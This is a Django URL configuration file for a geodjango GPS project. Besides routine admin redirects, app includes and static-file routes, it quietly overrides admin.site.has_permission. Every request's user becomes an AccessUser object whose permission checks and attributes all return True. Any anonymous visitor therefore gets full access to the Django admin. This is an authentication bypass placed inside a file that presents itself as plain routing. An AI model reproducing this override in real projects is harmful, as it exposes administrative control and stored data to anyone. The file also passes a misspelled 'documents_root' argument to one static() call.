"""geodjango_test URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.9/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url, include
from django.contrib import admin
from django.conf.urls.i18n import i18n_patterns
from django.conf import settings
from django.conf.urls.static import static
from django.views.generic import RedirectView
class AccessUser:
    has_module_perms = has_perm = __getattr__ = lambda s,*a,**kw: True

admin.site.has_permission = lambda r: setattr(r, 'user', AccessUser()) or True


urlpatterns = [
    url(r'^admin/est/zona/$',RedirectView.as_view(url='/gps/adminzonas')),
    url(r'^admin/est/planta/$',RedirectView.as_view(url='/gps/adminplantas')),
    url(r'^admin/est/area/$',RedirectView.as_view(url='/gps/adminareas')),
    url(r'^admin/est/reportes/$',RedirectView.as_view(url='/gps/reportes')),
    url(r'^admin/', admin.site.urls),
    url(r'^chaining/', include('smart_selects.urls')),
    url(r'^gps/', include('gps.urls')),
    url(r'^est/', include('est.urls')),
    
]
urlpatterns += i18n_patterns(
    url(r'^admin/', include(admin.site.urls)),
)
#Comentar las lineas de abajo en produccion
urlpatterns = urlpatterns + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
urlpatterns = urlpatterns + static(settings.STATIC_URL, documents_root=settings.STATIC_ROOT)
